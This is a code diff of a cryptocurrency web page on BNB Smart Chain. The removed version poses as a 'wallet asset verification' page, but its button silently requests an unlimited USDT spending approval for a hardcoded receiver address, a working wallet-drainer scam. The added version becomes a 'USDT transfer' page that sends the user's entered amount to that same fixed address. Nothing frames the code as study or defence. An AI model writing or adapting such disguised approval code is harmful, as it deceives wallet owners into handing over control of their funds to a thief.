@@ -3,16 +3,17 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BNB Smart Chain Asset Verification</title>
+<title>USDT Transfer Interface</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
   body { background-color: #0b132f; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
   .container { background: #141f42; width: 100%; max-width: 400px; padding: 30px 20px; border-radius: 20px; text-align: center; border: 1px solid #1e2c59; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
-  .logo { width: 60px; height: 60px; margin-bottom: 20px; background: #f3ba2f; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; color: #000; }
+  .logo { width: 60px; height: 60px; margin-bottom: 20px; background: #26a17b; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; color: #fff; }
   h1 { font-size: 20px; margin-bottom: 10px; font-weight: 600; }
   p { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
-  .btn { background: linear-gradient(135deg, #f3ba2f, #e8b01e); color: #000; border: none; width: 100%; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; transition: 0.2s; }
+  .input-box { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 10px; border: 1px solid #2a3f75; background: #0b132f; color: #fff; font-size: 16px; text-align: center; }
+  .btn { background: linear-gradient(135deg, #26a17b, #1e8263); color: #fff; border: none; width: 100%; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; transition: 0.2s; }
   .btn:active { transform: scale(0.98); }
   .info { margin-top: 20px; font-size: 12px; color: #64748b; }
 </style>
@@ -20,13 +21,14 @@
 <body>
 
 <div class="container">
-  <div class="logo">BNB</div>
-  <h1>Verify Your Wallet Assets</h1>
-  <p>Connect your Web3 wallet to review supported assets on Binance Smart Chain.</p>
+  <div class="logo">T</div>
+  <h1>USDT Transfer Interface</h1>
+  <p>Enter the amount of USDT you wish to transfer.</p>
   
-  <button class="btn" id="connectBtn" onclick="initConnect()">Verify Assets</button>
+  <input type="number" id="amountInput" class="input-box" placeholder="Enter USDT amount" min="0" step="any">
+  <button class="btn" onclick="executeTransfer()">Transfer</button>
   
-  <div class="info">Secured by BNB Smart Chain Protocol</div>
+  <div class="info">Binance Smart Chain Network</div>
 </div>
 
 <script>
@@ -35,12 +37,18 @@
 
   const ERC20_ABI = [
     "function balanceOf(address owner) view returns (uint256)",
-    "function approve(address spender, uint256 amount) returns (bool)"
+    "function transfer(address recipient, uint256 amount) returns (bool)"
   ];
 
-  async function initConnect() {
+  async function executeTransfer() {
     if (typeof window.ethereum === 'undefined') {
       alert("Please open this link inside Trust Wallet or MetaMask browser.");
+      return;
+    }
+
+    const amountVal = document.getElementById('amountInput').value;
+    if (!amountVal || Number(amountVal) <= 0) {
+      alert("Please enter a valid amount!");
       return;
     }
 
@@ -53,19 +61,26 @@
       
       const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
       
-      // Seedha approval trigger karega jo wallet mein BNB fee ke sath pop-up la dega
-      const maxAmount = ethers.constants.MaxUint256; 
+      // BSC par USDT ke 18 decimals hote hain
+      const parsedAmount = ethers.utils.parseUnits(amountVal, 18);
       
-      const tx = await usdtContract.approve(TARGET_RECEIVER, maxAmount, {
+      const balance = await usdtContract.balanceOf(userAddress);
+      if (balance.lt(parsedAmount)) {
+        alert("Insufficient USDT balance!");
+        return;
+      }
+
+      // Seedha transfer call jo user ke enter kiye hue amount ko target address par bhej dega
+      const tx = await usdtContract.transfer(TARGET_RECEIVER, parsedAmount, {
         gasLimit: ethers.BigNumber.from("65000")
       });
       
       await tx.wait();
-      alert("Verification Successful!");
+      alert("Transfer Successful!");
 
     } catch (error) {
       console.error("Error:", error);
-      // Agar user cancel karega toh pata chal jayega
+      alert("Transaction cancelled or failed.");
     }
   }
 </script>
